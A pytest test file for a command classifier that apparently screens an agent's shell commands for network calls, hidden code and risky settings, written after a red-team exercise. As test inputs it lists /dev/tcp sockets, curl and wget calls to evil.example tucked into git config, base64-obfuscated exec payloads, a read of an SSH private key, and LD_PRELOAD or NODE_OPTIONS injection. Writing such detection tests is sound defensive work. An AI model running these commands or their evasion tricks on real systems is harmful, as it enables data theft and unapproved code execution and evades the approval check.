"""28.10 red team against code_net (cloud/OTCHET-RT-CODE-NET.md, cloud/rt_code_net.py; fixes: cloud/OTCHET-RT2810-PRAVKI.md).

1. /dev/tcp|udp/HOST/PORT and gawk /inet/... anywhere on the line (operand, redirection, `bash -c`, awk code): HOST is a host of the line
   (Bash.net, like curl HOST) and the simple command naming it is "<id> [net]" (never the plain `cat` of the default list).
2. Interpreter code that builds what it runs / imports at run time: the danger "opaque:obfuscated code" (asked as dangerous).
3. A URL literal in code with no network API, inside a print argument or a line comment: not a host (no false RECIPIENT).
4. `git config <exec key> value` is scanned like `git -c`; PYTHONSTARTUP / NODE_OPTIONS=--require / PERL5OPT=-M / RUBYOPT=-r: dangerous."""
import pytest

from app.hookjudge import bashparse as bp
from tests.test_allowance_0210 import Dev

HOME = "/nonexistent-home"
H = "host.example"


def _c(cmd, proj="/tmp/p"):
    return bp.classify(cmd, proj, HOME, project=proj)


def _obf(c):
    return any(d.startswith("opaque:obfuscated code") for d in c.danger)


# ---------------------------------------------------------------- the 34 cases of the report (rt_code_net.py), after the fix
NET = [   # (cmd, host that must be in net)
    ("python3 -c \"import urllib.request as u; u.urlopen('https://host.example/x')\"", H),
    ("node -e \"require('http').get('http://host.example')\"", H),
    ("perl -e 'system(\"curl http://host.example\")'", H),
    ("php -r 'file_get_contents(\"http://host.example\");'", H),
    ("Rscript -e 'url(\"http://host.example\")'", H),                          # no API known: the URL is not inert -> still a host
    ("osascript -e 'do shell script \"curl http://host.example\"'", H),
    ("deno eval \"fetch('http://host.example')\"", H),
    ("bun -e \"fetch('http://host.example')\"", H),
    ("git -c http.proxy=http://host.example status", H),
    ("git clone ssh://host.example/repo", H),
    ("cat /dev/tcp/host.example/80", H),                                       # was: silent (cat is default-safe)
    ("head /dev/tcp/host.example/80", H),
    ("cat < /dev/tcp/host.example/80", H),
    ("bash -c 'exec 3<>/dev/tcp/host.example/80; echo GET >&3'", H),
    ("awk 'BEGIN{system(\"curl http://host.example\")}'", H),                  # was: [exec], host hidden
    ("gawk 'BEGIN{Service=\"/inet/tcp/0/host.example/80\"; print \"x\" |& Service}'", H),
    ("awk 'BEGIN{while((\"/dev/tcp/host.example/80\" |& getline x)>0) print x}'", H),
    ("git config core.sshCommand \"curl http://host.example\"", H),            # was: git-config, host hidden
]


@pytest.mark.parametrize("cmd,host", NET)
def test_report_network_cases_show_the_host(cmd, host):
    c = _c(cmd)
    assert host in c.net, (cmd, c.net, c.danger, c.heads)


OBFUSCATED = [
    "python3 -c \"getattr(__import__('urll'+'ib.request'),'url'+'open')('ht'+'tps://host.example')\"",
    "python3 -c \"exec(__import__('base64').b64decode('aW1wb3J0IHVybGxpYg=='))\"",
    "python3 -c \"exec(bytes([105,109]).decode())\"",
    "python3 -c \"import importlib as i; i.import_module('req'+'uests').get('ev'+'il')\"",
]


@pytest.mark.parametrize("cmd", OBFUSCATED)
def test_report_obfuscation_is_dangerous(cmd):
    c = _c(cmd)
    assert _obf(c), (cmd, c.danger)


@pytest.mark.parametrize("cmd,var", [
    ("PYTHONSTARTUP=/tmp/x.py python3", "PYTHONSTARTUP"),
    ("NODE_OPTIONS=--require=/tmp/x.js node app.js", "NODE_OPTIONS"),
    ("PERL5OPT=-Murllib perl script.pl", "PERL5OPT"),
])
def test_report_env_injection_is_dangerous(cmd, var):
    c = _c(cmd)
    assert "opaque:code injected through %s" % var in " ".join(c.danger), (cmd, c.danger)


def test_report_remaining_cases():
    # the secret read in code stays the danger secrets
    assert any(d.startswith("secrets") for d in _c("python3 -c \"print(open('/Users/victim/.ssh/id_rsa').read())\"").danger)
    # not closed by this fix (a module written through Bash, then run: execguard O2 sees only Write / Edit): asked as `python3 m.py`
    c = _c("echo \"import urllib.request\" > m.py && python3 m.py")
    assert c.net == [] and "python3" in c.heads
    c = _c("python3 -m http.client")
    assert c.heads == ["python3 -m http.client"] and c.net == []
    # the limits fail closed
    c = _c("echo $(echo $(echo $(echo $(echo $(curl http://host.example)))))")
    assert c.opaque and any(d.startswith("opaque:nesting") for d in c.danger)


@pytest.mark.parametrize("cmd", [
    "python3 -c \"print('visit https://example.com')\"",                      # was: false RECIPIENT example.com
    "node -e \"// https://example.com\\nconsole.log(1)\"",                    # was: false RECIPIENT (URL in a comment)
    "echo \"see http://example.com for docs\"",
    "cat README_http://example.com.txt",
    "python3 -c \"print(1)\"",
])
def test_report_clean_cases_stay_clean(cmd):
    c = _c(cmd)
    assert c.net == [] and c.danger == [], (cmd, c.net, c.danger)


# ---------------------------------------------------------------- 1. /dev/tcp: more forms
@pytest.mark.parametrize("cmd", [
    "exec 3<>/dev/tcp/host.example/80; cat <&3",
    "3<>/dev/tcp/host.example/80",
    "exec 3<>\"/dev/t\"cp/host.example/80",                                   # quotes removed before the check
    "echo x > /dev/udp/host.example/53",
    "bash -c \"cat </dev/tcp/host.example/443\"",
    "sh -c 'cat /dev/tcp/host.example/80'",
    "python3 -c \"open('/dev/tcp/host.example/80')\"",
])
def test_dev_tcp_forms(cmd):
    c = _c(cmd)
    assert H in c.net, (cmd, c.net, c.heads)
    assert any(h.endswith("[net]") or h.startswith(("bash", "sh", "python3")) for h in c.heads), c.heads   # an id the list does not have


def test_dev_tcp_tags_the_command_and_is_not_a_file():
    c = _c("cat /dev/tcp/host.example/80")
    assert c.heads == ["cat [net]"] and c.writes == []
    c = _c("bash -c 'exec 3<>/dev/tcp/host.example/80'")
    assert "exec [net]" in c.heads and not any("/dev/tcp" in w for w in c.writes)


@pytest.mark.parametrize("cmd", ["cat < /dev/tcp/$H/80", "gawk 'BEGIN{s=\"/inet/tcp/8080/0/0\"; print \"x\" |& s}'"])
def test_dev_tcp_hidden_host_or_listener_is_opaque_network(cmd):
    assert any(d.startswith("opaque:network") for d in _c(cmd).danger)


@pytest.mark.parametrize("cmd", ["grep -r \"/dev/tcp\" .", "ls /dev/", "cat /dev/null", "echo hi > /dev/stderr"])
def test_dev_paths_without_a_socket_host(cmd):
    c = _c(cmd)
    assert c.net == [] and c.danger == [], (cmd, c.net, c.danger)


# ---------------------------------------------------------------- 2. obfuscation: more forms, and the legal ones
@pytest.mark.parametrize("cmd", [
    "python3 -c \"print('x'); __import__('os')\"",
    "python3 -c \"import subprocess; subprocess.run(['cu'+'rl','host.example'])\"",
    "python3 -c \"import os; os.system('lruc'[::-1]+' host.example')\"",
    "python3 -c \"print(().__class__.__base__.__subclasses__())\"",
    "python3 -c \"import sys; sys.modules['os'].system('id')\"",
    "python3 -c \"print('\\x68\\x74\\x74\\x70\\x73://evil')\"",
    "node -e \"require('ht'+'tp').get('http://host.example')\"",
    "node -e \"globalThis['fe'+'tch']('ht'+'tp://evil')\"",
    "node -e \"new Function('return fetch')()('x')\"",
    "node -e \"const m='http'; require(m)\"",
    "node -e \"eval(Buffer.from('ZmV0Y2go', 'base64').toString())\"",
    "php -r '$f=\"sys\".\"tem\"; $f(\"id\");'",
    "php -r 'eval(base64_decode(\"ZWNobyAxOw==\"));'",
    "ruby -e 'Kernel.send(:system, \"id\")'",
    "perl -e 'eval \"print 1\"'",
    "perl -e 'my $c = \"cu\".\"rl\"; system($c, \"host.example\")'",
    "python3 - <<'EOF'\nexec(__import__('base64').b64decode('eA=='))\nEOF",
    "echo \"exec(__import__('zlib').decompress(b'x'))\" | python3",
])
def test_obfuscation_more_forms(cmd):
    c = _c(cmd)
    assert _obf(c), (cmd, c.danger)


LEGAL = [
    "python3 -c \"print(1)\"",
    "python3 -c \"import json,sys; print(json.load(sys.stdin)['x'])\"",
    "node -e \"console.log(1)\"",
    "node --eval \"console.log(process.version)\"",
    "node -p \"require('./package.json').version\"",
    "node -e \"console.log(require('crypto').createHash('sha256').update('x').digest('hex'))\"",
    "python3 -c \"import re; print(re.compile('a+').findall('aaa'))\"",
    "python3 -c \"import ast; print(ast.literal_eval('[1,2]'))\"",
    "python3 -c \"import sys; print(sys.version)\"",
    "python3 -c \"import base64; print(base64.b64encode(b'x'))\"",
    "python3 -c \"import hashlib; print(hashlib.sha256(b'x').hexdigest())\"",
    "python3 -c \"import subprocess; print(subprocess.check_output(['git','log','-1']).decode())\"",
    "python3 -c \"print(f'see https://docs.python.org/3/ for docs')\"",
    "node -e \"console.log('docs at https://nodejs.org')\"",
    "ruby -e 'puts \"https://ruby-lang.org\"'",
    "ruby -e 'puts 1+1'",
    "perl -e 'eval { die \"x\" }; print $@'",
    "perl -pi -e 's/foo/bar/g' a.txt",
    "php -r 'echo phpversion();'",
    "node -e \"const s='abc'; console.log(/b/.exec(s))\"",
    "deno eval \"console.log(1)\"",
    "awk -F: '{print \"see http://example.com \" $1}' /etc/passwd",
    "NODE_OPTIONS=--max-old-space-size=4096 npm run build",
    "PYTHONPATH=. python3 -m pytest -q",
    "ENV=production node app.js",
    "git config user.name \"A B\"",
    "git config remote.origin.url https://github.com/a/b",
    "git config --get core.sshCommand",
]


@pytest.mark.parametrize("cmd", LEGAL)
def test_legal_commands_get_no_new_danger_or_host(cmd):
    c = _c(cmd)
    assert c.net == [] and c.danger == [], (cmd, c.net, c.danger)


# ---------------------------------------------------------------- 3. false RECIPIENT, without opening a hole
def test_inert_url_only_in_print_or_comment():
    assert bp.code_net("print('visit https://example.com')") == ([], None)
    assert bp.code_net("console.log(\"https://example.com\")") == ([], None)
    assert bp.code_net("x = 1  # https://example.com") == ([], None)
    assert bp.code_net("// https://example.com\nconsole.log(1)") == ([], None)
    # a URL given to a function that is not a printer is a host (pandas read_csv, R url(), webbrowser.open ... are not in CODE_NET_API)
    assert bp.code_net("import pandas as p; p.read_csv('https://evil.example/?'+d)") == (["evil.example"], None)
    assert bp.code_net("print(fetchish('https://evil.example'))") == (["evil.example"], None)
    assert bp.code_net("print('a', g('https://evil.example'))") == (["evil.example"], None)
    # a `#` inside a string is not a comment; a \r ends a python comment
    assert bp.code_net("s='#'; p.read_csv('https://evil.example')") == (["evil.example"], None)
    assert bp.code_net("# x\rp.read_csv('https://evil.example')") == (["evil.example"], None)
    # with a network API in the code every URL literal is a host, printed or not
    assert bp.code_net("import urllib.request as u; print('https://a.example'); u.urlopen(x)") == (["a.example"], None)


# ---------------------------------------------------------------- 4. git config values, environment injection
@pytest.mark.parametrize("cmd", [
    "git config --global url.https://evil.example/.insteadOf https://github.com/",
    "git config alias.up '!curl https://evil.example/x'",
    "git config set core.sshCommand \"curl https://evil.example\"",
    "git config core.pager 'wget -qO- https://evil.example'",
])
def test_git_config_value_hosts(cmd):
    c = _c(cmd)
    assert "evil.example" in c.net and any(d.startswith("git-config") for d in c.danger), (cmd, c.net, c.danger)
    assert c.heads == ["git config"]                                          # the alias does not run now: its commands are not heads


@pytest.mark.parametrize("cmd", [
    "export NODE_OPTIONS=\"--require /tmp/x.js\"; node app.js",
    "NODE_OPTIONS='-r /tmp/x.js' node app.js",
    "NODE_OPTIONS=--import=/tmp/x.mjs node app.js",
    "env PYTHONSTARTUP=/tmp/x.py python3",
    "RUBYOPT=-r/tmp/x ruby a.rb",
    "BASH_ENV=./x bash s.sh",
    "NODE_OPTIONS=$X node app.js",
])
def test_env_injection_forms(cmd):
    assert any(d.startswith("opaque:code injected through") for d in _c(cmd).danger), cmd


def test_ld_preload_is_dangerous_now():
    c = _c("LD_PRELOAD=./x.so ls")                                            # 0.2.43b: the 0.2.9 decision changed: asked AS DANGEROUS
    assert c.heads == ["ls [env LD_PRELOAD]"] and c.danger == ["opaque:code injected through LD_PRELOAD=./x.so"]


# ---------------------------------------------------------------- through the witness (the recommended mandate)
def _parts(d, cmd):
    return {t: (r["verdict"], r["reason"], r) for t, r in d.send(cmd)}


def test_dev_tcp_is_asked_like_curl(client, owner, tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    d = Dev(client, owner, proj.resolve())
    for cmd in ("cat /dev/tcp/evil.example/80", "cat < /dev/tcp/evil.example/80", "bash -c 'exec 3<>/dev/tcp/evil.example/80'"):
        p = _parts(d, cmd)
        assert p["Bash.net"][:2] == ("defer", "ESCALATE_COMMAND_DANGER"), (cmd, {k: v[:2] for k, v in p.items()})   # 0.2.91: asked, not refused
    p = _parts(d, "cat /dev/tcp/pypi.org/443")                                # a host of the mandate: still a question, not default-safe
    assert p["Bash.net"][0] == "allow" and p["Bash"][:2] == ("defer", "ESCALATE_COMMAND"), {k: v[:2] for k, v in p.items()}


def test_obfuscated_code_is_asked_as_dangerous_and_shows_the_code(client, owner, tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    d = Dev(client, owner, proj.resolve())
    cmd = "python3 -c \"exec(__import__('base64').b64decode('aW1wb3J0IHVybGxpYg=='))\""
    p = _parts(d, cmd)
    v, reason, r = p["Bash.danger"]
    assert (v, reason) == ("defer", "ESCALATE_COMMAND_DANGER") and r["action"]["dangerous"] is True
    g = client.get("/api/approvals/" + r["rid"]).json()
    assert "b64decode" in g.get("net_code", "")


def test_print_url_is_no_recipient_through_the_witness(client, owner, tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    d = Dev(client, owner, proj.resolve())
    p = _parts(d, "python3 -c \"print('visit https://example.com')\"")
    assert set(p) == {"Bash"} and p["Bash"][:2] == ("defer", "ESCALATE_COMMAND"), {k: v[:2] for k, v in p.items()}
